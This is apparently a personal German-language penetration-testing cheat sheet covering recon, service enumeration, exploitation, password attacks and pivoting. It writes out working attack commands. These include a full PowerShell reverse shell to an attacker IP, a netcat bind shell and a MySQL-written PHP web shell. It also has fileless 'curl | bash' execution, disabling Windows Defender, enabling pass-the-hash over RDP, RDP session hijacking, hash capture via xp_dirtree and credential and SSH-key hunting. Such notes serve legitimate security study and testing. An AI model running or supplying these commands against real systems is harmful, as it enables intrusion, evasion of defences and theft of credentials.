```
Firefox Extensions:
	- 1password
	- FoxyProxy
	- Firefox Containers
	- Cookies Quick Manager
```
# Information Gathering
## External Recon

### DNS / IP / Zertifikate
- [ICANN](https://lookup.icann.org/en)
- [WhoIS Lookup](https://whois.domaintools.com/)
- [ViewDNS](https://viewdns.info/)
- [IANA](https://www.iana.org/) fuer NA
- [RIPE](https://www.ripe.net/) fuer EU
- [BGP Toolkit](https://bgp.he.net/)
- [NsLookup](https://www.nslookup.io/)
- [Crt.sh](https://crt.sh/)
- [VirusTotal](https://www.virustotal.com/gui/home/search)
- [censys](https://search.censys.io/)
- [Netcraft](https://sitereport.netcraft.com/)
- [The Harvester](https://github.com/laramies/theHarvester)
- [ZoneTransfers](https://hackertarget.com/zone-transfer/)
- [Gobuster](https://github.com/OJ/gobuster) with DNS Module
- [DNSX](https://github.com/projectdiscovery/dnsx)
- [DnsDumpster](https://dnsdumpster.com/)

### Infrastruktur
- [Whatweb](https://www.morningstarsecurity.com/research/whatweb) erkennt JS Libraries, Web-Server usw
- [Wappalyzer](https://www.wappalyzer.com/) erkennt JS Libraries, Web-Server usw
- [WafWOOf](https://github.com/EnableSecurity/wafw00f) Anwendungs Firewall Fingerprinting

### Social Media
- Social Media von Mitarbeitern ueberpruefen
- Google Suche [Cheatsheet](https://www.exploit-db.com/google-hacking-database)
- Stellenangebote wie LinkedIn, Indeed.com, Glassdoor

### Breach Data Sources
- [HaveBeenPwned](https://haveibeenpwned.com/)
- [Dehashed](https://www.dehashed.com/)

## Enumeration

### Web Enumeration
- [ffuf](https://github.com/ffuf/ffuf)
- [ffuf Guide](https://codingo.io/tools/ffuf/bounty/2020/09/17/everything-you-need-to-know-about-ffuf.html)

### Host Discovery
- [nmap](https://linux.die.net/man/1/nmap) <Netzwerk_Adresse/Praefix> <Optionen>

### Host/Port Scanning
- [nmap](https://linux.die.net/man/1/nmap) <IP_Adresse> <Optionen>
- Status von Ports:
```
- open: Verbindungen hergestellt
- closed: Verbindungen nicht hergestellt. TCP RST Flag kommt zurueck
- filtered: Wir bekommen einen Error Code oder keine Rueckmeldung
- unfiltered: Ein TCP-ACK kommt zurueck. Kann open|closed sein
- open|filtered: Wir bekommen keine Antwort von dem Port
- closed|filtered: Kommt nur bei IP ID idle Scans vor ist nicht moeglich zu unterscheiden zwischen closed|filtered
```

### Scan Optionen
```
- -sn | Deaktiviert Port Scanning
- -iL | Fuehrt definierte Scans gegen die angegebene Liste durch
- -PE | Fuehrt einen Ping Scan mit einer ICMP Echo Anfrage aus
- --packet-trace | Zeigt alle gesendeten und empfangenen Pakete
- --reason | Zeigt den Grund fuer die Ausgabe
- --disabled-arp-ping | Wir koennen fuehrt den SCAN mit 

- -sS | Scannt die Top 1000 TCP Ports mit einem SYN Paket 
- -sT | TCP Scan baut eine Verbindung auf
- -sA | TCP ACK Scan ist schwieriger von einer Firewall zu filtern
- -sU | Fuehrt einen UDP Scan aus
- -sV | Gibt weitere Informationen fuer den Port aus
- -Pn | Deaktiviert ICMP Echo Anfragen
- -n | Deaktiviert die DNS-Aufl√∂sung
- -o | Liest das Betriebssytem aus

- -p | Spezifiziert Ports einzelnd (-p 21,22,23) nach Bereichen(-p 22-333)
- -p- | Scannt alle Ports
- --top-ports= | Scannt die Top X Ports
- -F | Scannt die Top 100 Ports

- -T | Gibt an wie schnelle der Scan laeuft 5 ist aggressiv 0 ist friedlich
- --min-parallelism | Anzahl der parallelen Sonden
- --max-rtt-timeout | Maximale Zeit nachdem Timeoutzeit ein Paket haben sollte 
- --min-rate | Mindest Anzahl an Paketen die gleichzeitig gesendet werden
- --max-retries | Maximale Anzahl von Wiederholungen
```

### Ausgabe
```
- -oN | Erstelle einen Ausgabe mit .nmap Dateiendung
- -oG | Erstellt Grepable Ausgabe mit .gnmap Dateiendung 
- -oX | Erstellt einen XML Ausgabe mit .xml Dateiendung
- xsltproc | Erstellt aus einem XML Ausgabe eine HTML Seite
- -oA | Speichert Ausgabe in allen Formaten
```

### Scripting Engine
- --script | Ein internes Nmap Script kann ausgefuehrt werden
- [Script Kategorien](https://nmap.org/nsedoc/scripts/)
- [Script Listen](https://nmap.org/book/nse-usage.html)

### SMB
- [Enum4Linux](https://github.com/CiscoCXSecurity/enum4linux)
- [Responder](https://github.com/lgandx/Responder)
- [RPCclient](https://www.samba.org/samba/docs/current/man-html/rpcclient.1.html)
- [impacket-ntlmrelayx](https://github.com/fortra/impacket/blob/master/examples/ntlmrelayx.py)
```
- Auflisten Shares mit null Session: smbclient -N -L //<IP>
- Mit Share verbinden: smbclient //<IP>/<Sharename>
- smbmap -H <IP> -r <Foldername>
```

### NFS
```
- Show Mounts: showmount -e <IP>
- sudo mount -t nfs <IP>:/ .<Local_Dir> -o nolock
```

### DNS
```
- Gibt andere Server aus: dig ns <Domain> @<DNS_Server_IP>
- Gibt alle Eintrage im DNS Server aus: dig any <Domaine> @<DNS_Server_IP>
- Gibt eine Zone des DNS Servers aus: dig axfr <Zone.Domaine> @<DNS_Server_IP>
```

#### Sudbdomaine Bruteforcing
- [DnsEnum](https://github.com/fwaeytens/dnsenum)
- [Firece](https://github.com/mschwager/fierce)
- [Subfinder](https://github.com/projectdiscovery/subfinder)
- [Sublist3r](https://github.com/aboul3la/Sublist3r)
- [Subbrute](https://github.com/TheRook/subbrute)
```
- dnsenum --dnsserver <DNS_IP> --enum -p 0 -s 0 -o <Output.txt> -f <WordList> <Domaine>
- fierce --domain <Domain>
- ./subfinder -d <Domain> -v 
```

#### DNS Spoofing
- Bei einem DNS Cache Spoofing wird ein DNS Eintrag manipuliert:
- [Ettercap](https://www.ettercap-project.org/)
- [Bettercap](https://www.bettercap.org/)

### Email
```
- host -t MX <Domain>
- dig mx <Domain>
- host -t A <Maildomain>
```

#### SMTP
- [SMTP Befehle](https://mailtrap.io/blog/smtp-commands-and-responses/)
- [SMT-User-Enum](https://github.com/pentestmonkey/smtp-user-enum)
```
- telnet <IP> 25
```

#### IMAP
- [IMAP Befehle](https://www.atmail.com/blog/imap-commands/)
```
- openssl s_client -connect <IP>:imaps
```

#### POP3
- [POP3 Befehle](https://faq.netzprisma.de/so-funktioniert-pop3/)
```
- openssl s_client -connect <IP>:pop3s
```

#### Cloud
- [O365Spray](https://github.com/0xZDH/o365spray)

### SNMP
- [Snmpwalk](https://linux.die.net/man/1/snmpwalk)
- [OneSixtyOne](https://github.com/trailofbits/onesixtyone)
```
- snmpwalk -v2c -c public <IP>
- onesixtyone -c <SNMP_Wordlist> <IP>
```

### Oracle TNS
```
- Odat (git clone https://github.com/quentinhardy/odat.git)
- ./odat.py all -s <IP>
- Connect to Oracle Database: sqlplus <User>/<Password>@<IP>/XE;
```
### FTP
#### FTP Bounce Attack
```
- FTP Server kann Traffic an einen anderes Geraet weitersenden
- Beispiel: nmap -Pn -v -n -b <User>:<Password>@<FTP_Server_IP> <IP_zu_Scannen>
```

### SQL
#### Connect
```
- mysql -u <User> -p<Password> -h <IP>
- sqsh -S <IP> -U <User> -P '<Password>' -h
- sqsh -S <IP> -U .\\<User> -P '<Password>' -h
- sqlcmd -S SRVMSSQL -U <User> -P '<Password>' -y 30 -Y 30
- mssqlclient.py -p <Port> <User>@<IP>
```

#### Syntax
##### MySQL
```
- Show Database:
	- SHOW DATABASES;
- Select a Database:
	- USE <Database>;
- Show Tables:
	- SHOW TABLES;
```

##### MsSQL
```
- Show Database:
	- SELECT name FROM master.dbo.sysdatabases
- Select a Database:
	- USE <Database>
- Show Tables:
	- SELECT table_name FROM <Database>.INFORMATION_SCHEMA.TABLES
```
#### Execute Commands
##### MsSQL
- [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver15)
- Wenn xp_cmdshell nicht aktiviert ist
```
- EXECUTE sp_configure 'show advanced options', 1
- RECONFIGURE
- EXECUTE sp_configure 'xp_cmdshell', 1
- RECONFIGURE
```

###### Read Local Files
```
- SELECT * FROM OPENROWSET(BULK N'<Local_File>', SINGLE_CLOB) AS Contents
```

- Wenn das nicht funktioniert
```
- sp_configure 'show advanced options', 1
- RECONFIGURE
- sp_configure 'Ole Automation Procedures', 1
- RECONFIGURE
```

###### Capture Hash
- [Responder](https://github.com/lgandx/Responder) starten oder
- [impacket-smbserver](https://github.com/SecureAuthCorp/impacket) starten
```
- EXEC master..xp_dirtree '\\<IP>\share\'
- EXEC master..xp_subdirs '\\<IP>\share\'
```

- Identifizieren Sie Benutzer, fuer die wir uns ausgeben koennen
```
- SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'
```

###### Rolle und User verifizieren
```
- SELECT System_User
- SELECT IS_SRVROLEMEMBER('sysadmin')
```

- Sich als ein User ausgeben
```
- EXECUTE AS LOGIN = '<User>' SELECT SYSTEM_USER SELECT IS_SRVROLEMEMBER('sysadmin')
```

###### Mit anderer Datenbank kommunizieren
- Linked Server ausgeben
```
- SELECT srvname, isremote FROM sysservers
```

- Mit Execute koennen wir Statements auf einem anderen Server ausfuehren
```
- EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [<Srvname>]
```

##### MySQL
```
- Write Local Files:
	- SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '<WebShell_OutputFile>';
	- Die Variable securet_file_priv verwaltet Rechte fuer Daten Import/Export
- Read Local Files:
	- select LOAD_FILE("/etc/passwd");
```
	
### RDP
- [xfreerdp](https://linux.die.net/man/1/xfreerdp)
#### RDP Session Hijacking
```
- Eingloggte User anzeigen:
	- query user
- Um sich als einen User anderen User auszugeben:
	- sc.exe create sessionhijack binpath= "cmd.exe /k tscon <Target_SessionID> /dest:<Our_SessionID>"
	- net start sessionhijack
```
#### RDP Pass-the-Hash
```
- Wenn Pass-the-Hash nicht zugelassen wird koennen wird dies aktivieren
	-reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
- xfreerdp /v:<IP> /u:<User> /pth:<Hash>
```

# Exploitation
## File Transfer
### Windows File Transfer Download
#### Base64 Download
```
- cat <File> |base64 -w 0;echo
- [IO.File]::WriteAllBytes("<Speicherort>", [Convert]::FromBase64String("<Base64String>"))
```

#### [PowerShell Web Downloads](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0)
```
- sudo python3 -m pyftpdlib --port 21
- (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
- (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
```

#### SMB
```
- sudo impacket-smbserver <Sharename> -smb2support <Ordner_fuer_Share>
- copy \\<IP>\<Sharename>\<Dateiname>
```

#### FTP:
```
- sudo python3 -m pyftpdlib --port 21
- (New-Object Net.WebClient).DownloadFile('ftp://<IP>/<Dateiname>', '<Speicherort>')
```

### Windows File Transfer Upload
#### Base 64 Upload
```
- Convert]::ToBase64String((Get-Content -path "<Dateiname>" -Encoding byte))
- echo <Base64_String>| base64 -d > hosts
```

#### [PowerShell Web Uploads](https://learn.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0)
```
- pip3 install uploadserver
- python3 -m uploadserver
- IEX(New-Object Net.WebClient).DownloadString('<IP>/<Datei>')
- Invoke-FileUpload -Uri http://<IP>:<Port>/<Datei> -File <AusgabeDatei>
```

#### SMB
```
- sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
- dir \\<IP>\<Sharename>
```
	
#### FTP
```
- sudo python3 -m pyftpdlib --port 21 --write
- (New-Object Net.WebClient).UploadFile('ftp://<IP>/<Datei>', '<Speicherort>')
```

### Linux File Transfer
#### Base64 Upload/Download
```
- cat <Dateiname> |base64 -w 0;echo
- echo -n '<Base64_String>' | base64 -d > <Dateiname>
```
	
#### Web Downloads/Upload
```
- wget <URLtoFile> -O <OutputFile>
- curl -o <OutputFile> <URLtoFile>
```

#### Fileless Download
```
- curl <URL_to_Script> | bash/python3...
- wget -qO- <URL_to_Script> | bash/python3...
```
	
#### SSH
```
- scp <User>@<IP>:<File> .
```
	
#### Server for FileTransfer:
```
- python3 -m http.server
- python2.7 -m SimpleHTTPServer
- php -S 0.0.0.0:8000
- ruby -run -ehttpd . -p8000
```

## Shell
### TTY Shell
#### Python
```
- python -c 'import pty; pty.spawn("/bin/sh")'
```

#### Bin sh
```
- /bin/sh -i
```

#### Perl
```
- perl ‚Äîe 'exec "/bin/sh";'
- perl: exec "/bin/sh";
```

#### Ruby
```
- ruby: exec "/bin/sh"
```

#### Lua
```
- lua: os.execute('/bin/sh')
```

#### AWK
```
- awk 'BEGIN {system("/bin/sh")}'
```
	
### Bind Shell with Netcat Linux
```
- Attacker: nc -nv <Target_IP> <Port>
- Target: rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l <Target_IP> <Port> > /tmp/f
```

### Reverse Shell Windows
```
- Attacker: sudo nc -lvnp 443
- Target: powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<Attacker_IP>',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
	- Wenn Windows Defender dies blockiert 
	- PowerShell: Set-MpPreference -DisableRealtimeMonitoring $true
```

### Web Shell
- [Laudanum](https://github.com/jbarcia/Web-Shells/tree/master/laudanum)
- [Antak](https://github.com/samratashok/nishang/tree/master/Antak-WebShell)
- [WhiteWinterWolf PHP Web Shell](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)

### Payloads
- [msfvenom](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html)
- [Metasploit](https://www.metasploit.com/)
- [Virustotal](https://www.virustotal.com/gui/home/upload)
- [Reverse Chell Cheat Sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [Reverse Shell Generator](https://www.revshells.com/)
- [Payload All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)

#### Payload Types:
```
- DLL: Dynamic Linking Library sind Library Dateien in Windows
- Batch: Ausfuehrtbare Textdatei unter Windows
- VBS: Internes Script unter Excel Dokumente
- MSI: Windows Installer Datei fuer Installations Datenbank
- Powershell: Script Sprache fuer PowerShell
```

## Password Attacks
### Wordlists
- [InsideTrust](https://github.com/insidetrust/statistically-likely-usernames)
- [SecLists](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials)
	
### Remote Password Attacks
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)
- [Evil-WinRM](https://github.com/Hackplayers/evil-winrm)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Medusa](https://github.com/jmk-foofus/medusa)

### Default Password
- [DefaultCreds Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet)
### Windows Local Password Attacks
#### SAM: Besteht aus 3 Hives SAM, System, Security
- [Secretsdump.py](https://github.com/fortra/impacket/blob/master/examples/secretsdump.py)
- Remote Dumping mit crackmapexec --lsa/--sam
#### LSASS: 
- Dumping LSASS
- [Pypykatz](https://github.com/skelsec/pypykatz)
- [Mimikatz](https://github.com/ParrotSec/mimikatz)
	
### Brute Forcing
- [HashCat](https://github.com/hashcat/hashcat)
- [JohnTheRipper](https://github.com/openwall/john)

### Persoenliche Woerterliste
- [CUPP](https://github.com/Mebus/cupp)
- [RSMangler](https://github.com/digininja/RSMangler)
- [Mentalist](https://github.com/sc0tfree/mentalist)
- [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)

### Credential Hunting
```
- sudo python dehashed.py -q Domain -p
```

#### Windows
- [LaZagne](https://github.com/AlessandroZ/LaZagne)
```
- Findstr: findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```
	
#### Linux:
- [Firefox Decrypt](https://github.com/unode/firefox_decrypt)
```
- Credentials inConfig Files: for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
- Bash History
```
##### Cracking Archives/Files/Documents/SSH Keys
###### Encoded Dateien finden
```
- for ext in $(echo ".xls .xls* .xltx .csv .od* .doc .doc* .pdf .pot .pot* .pp*");do echo -e "\nFile extension: " $ext; find / -name *$ext 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
###### SSH Keys finden
```
- grep -rnw "PRIVATE KEY" /* 2>/dev/null | grep ":1"
```

## XSS(Cross-Site-Scripting)
### DOM Dicovery
- [Nessus](https://www.tenable.com/products/nessus)
- [Burp Pro](https://portswigger.net/burp/pro)
- [ZAP](https://owasp.org/www-project-zap/)
- [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS)
- [XSSer](https://github.com/epsylon/xsser)
	
- [XSS Strike](https://github.com/s0md3v/XSStrike)
```
- git clone https://github.com/s0md3v/XSStrike.git 
- cd XSStrike
- pip install -r requirements.txt
- python xsstrike.py
- python xsstrike.py -u "http://<SERVER_IP>:<PORT>/<WebPage>?<Eingabefeld>=<Input>"
```

# Post-Exploitation/Privilege Escalation
```
- [LOLBAS](https://lolbas-project.github.io/) for Windows
- [GTFOBins](https://gtfobins.github.io/) for Linux
- [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS)
- [LinEnum](https://github.com/rebootuser/LinEnum)
```

# Lateral Movement
## [Pass the Hash](https://attack.mitre.org/techniques/T1550/002/)
### PowerShell
- [Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)

### Linux
- [Impacket](https://github.com/fortra/impacket) mit PsExec, WmiExec, AtExec, SmbExec
- [CrackMapExec](https://github.com/Porchetta-Industries/CrackMapExec)

## [Pass the Ticket](https://attack.mitre.org/techniques/T1550/003/)
- Wir koennen mit einem Kerberos Tickets stehlen
	
### Windows
- [Mimikatz](https://github.com/ParrotSec/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus)
	
### Linux
- [Keytab Extract](https://github.com/sosdave/KeyTabExtract)
	
#### Kerberos Tickets finden
```
- find / -name *keytab* -ls 2>/dev/null
- env | grep -i krb5
```

## Dymamic Port Forwarding with SSH and Socks Tunneling:
### Local Port Forwarding
```
- ssh -L <Local_Port>:localhost:<Target_Port> <User>@<IP>
```
	
### Enabling Dynamic Port Forwarding with SSH
```
- ssh -D <Local_Port> <User>@<IP>
```
	
### Proxychains
```
- /etc/proxychains.conf
- proxychains nmap <IP>
```

## Remote/Reverse Port Forwarding with SSH:
```
- ssh -R <InternalIPofPivotHost>:<ListenPort>:0.0.0.0:<AttackPort> <User>@<ipAddressofTarget> -vN
```
	
## Meterpreter Tunneling & Port Forwarding
```
- Metasploit: use exploit/multi/handler
```

### SOCKS Proxy konfigurieren
```
- use auxiliary/server/socks_proxy
```

### Erstellen von Routes mit AutoRoute
```
- run autoroute -s <NetzwerkAdresse>/<Praefix>
```

### Port Forwarding
```
- Meterpreter beinhaltet das Modul portwd
- portfwd add -l <Local_Attack_Port> -p <Target_Host> -r <Target_IP>
```
	
### Reverse Port Forwarding
```
- portfwd add -R -l <Local_Attack_Port> -p <Target_Port> -L <Local_Attack_IP>
```

## Socat Umleitung mit einer Reverse Shell
### Socat Listener auf dem Target Host starten
```
- socat TCP4-LISTEN:<Local_Port>,fork TCP4:<Attack_IP>:<Attack_Port>
- Dann Payload auf dem Target ausfuehren
- Auf dem Attack Host einen Handler ausfuehren
```

### Socat Umleitung mit einer Bind Shell
```
- Socat Listener auf dem Attack Host starten
- socat TCP4-LISTEN:<Attack_Port>,fork TCP4:<Target_IP>:<Target_Port>
```
	
### SSH for Windows with [plink.exe](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
#### Start Dynamic Port Forwarding
```
- plink -D <Port> <User>@<IP>
```
	
#### SSH Pivoting mit [Sshuttle](https://github.com/sshuttle/sshuttle)
```
- Erstellt eine Route auf dem Target_Host
- sudo sshuttle -r <User>@<IP> <Netzwerkadresse>/<Praefix> -v
```
	
#### Web Server Pivoting mit [Rpivot](https://github.com/klsecservices/rpivot)
```
- Mit Rpivot mit Python3(https://github.com/lisp3r/rpivot2)
- Auf dem Attack Host Server ausfuehren:
	- python2.7 server.py --proxy-port <Remote_Host> --server-port <Local_Port> --server-ip 0.0.0.0
- Auf dem Pivot Target Client ausfuehren:
	- python2.7 client.py --server-ip <Server_IP> --server-port <Server_Port>
```
	
#### Port Forwarding mit Windows [Netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts)
```
- netsh.exe interface portproxy add v4tov4 listenport=<ListenPort> listenaddress=<ListenAdress> connectport=<ForwardPort> connectaddress=<ForwardAdress>
```
	
### Tunnels
#### DNS Tunnel mit [DNScat2](https://github.com/iagox86/dnscat2)
```
- Server Starten:
	- sudo ruby dnscat2.rb --dns host=<Server_IP>,port=53,domain=<DNS_Domain> --no-cache
- Client Starten(https://github.com/lukebaggett/dnscat2-powershell):
	- git clone https://github.com/lukebaggett/dnscat2-powershell.git
	- Import-Module .\dnscat2.ps1
	- Start-Dnscat2 -DNSserver <Server_IP> -Domain <DNS_Domain> -PreSharedSecret <Server_Secret> -Exec cmd
- Session etablieren:
	- window -i 1
```
	
#### SOCKS5 Tunnel mit [Chisel](https://github.com/jpillora/chisel)
```
- Chisel bauen:
	- git clone https://github.com/jpillora/chisel.git
	- cd chisel
	- go build
- Chisel Server auf dem Pivot Server ausfuehren:
	- ./chisel server -v -p <Listener_Port> --socks5
- Chisel Client auf dem Attack Host:
	- ./chisel client -v <Server_IP>:<Server_Port> socks
- Proxychains anpassen

- Chisel Reverse Pivot:
	- Server auf dem Attack Host starten:
		- sudo ./chisel server --reverse -v -p <Listen_Port> --socks5
	- Pivot Host verbindet sich mit Attack Host:
		- ./chisel client -v <Attack_Host_IP>:<Attack_Host_Port> R:socks
	- Proxychains anpassen
```
	
#### ICMP Tunnel mit SOCKS
```
- Setting Up ptunnel-ng(https://github.com/utoni/ptunnel-ng):
	- git clone https://github.com/utoni/ptunnel-ng.git
	- sudo ./autogen.sh
- Starting ptunnel:
	- Ptunnel Server auf dem Target Host:
		- sudo ./ptunnel-ng -r<Server_IP> -R22
	- Attack Host mit Server verbinden:
		- sudo ./ptunnel-ng -p<Server_IP> -l<Lokaler_Port_auf_Attack_Port> -r<Server_IP> -R22
- Use Tunneling:
	- ssh -p<Lokaler_Port_auf_Attack_Port> -l<User> 127.0.0.1
	- Enable Dynamic Port Forwarding:
		- ssh -D 9050 -p<Lokaler_Port_auf_Attack_Port> -l<User> 127.0.0.1
```


















